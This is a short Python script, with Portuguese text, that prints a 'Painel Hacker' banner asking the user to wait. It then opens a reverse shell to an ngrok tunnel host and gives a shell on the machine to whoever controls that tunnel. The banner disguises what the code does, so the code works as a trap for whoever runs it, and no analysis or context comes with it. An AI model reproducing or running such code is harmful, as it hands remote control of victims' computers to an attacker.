print('''
 == Painel Hacker ==

 [Aguarde, pode ser demorado...]
''')

import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",13608));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
